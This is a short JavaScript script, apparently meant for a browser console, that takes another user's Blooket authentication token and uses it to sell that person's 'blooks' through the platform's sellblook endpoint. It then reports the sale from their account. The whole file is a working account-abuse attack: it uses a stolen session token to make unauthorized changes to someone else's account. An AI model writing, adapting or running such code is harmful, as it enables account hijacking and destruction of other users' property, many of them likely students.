const TOKEN = prompt("Enter their token: ");
const BLOOK = prompt("Which blook: ");
const QUAN = prompt("Quantity: ");

async function getName(authToken) {
  const response = await fetch('https://api.blooket.com/api/users/verify-token?token=JWT+' + authToken);
  const data = await response.json();

  return data.name
};

const NAME = await getName(TOKEN.split("JWT ")[1]);

const RES = await fetch("https://api.blooket.com/api/users/sellblook", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "authorization": TOKEN,
    "content-type": "application/json;charset=UTF-8"
  },
  "referrerPolicy": "no-referrer",
  "body": "{\"name\":\"" + NAME + "\",\"blook\":\"" + BLOOK + "\",\"numSold\":" + QUAN + "}",
  "method": "PUT",
  "mode": "cors",
  "credentials": "include"
});

if (RES.status == 200) {
    alert("Successfully sold " + QUAN + " " + BLOOK + " from " + NAME + "'s account. ");
}
else {
    alert("Error: " + RES.statusText);
}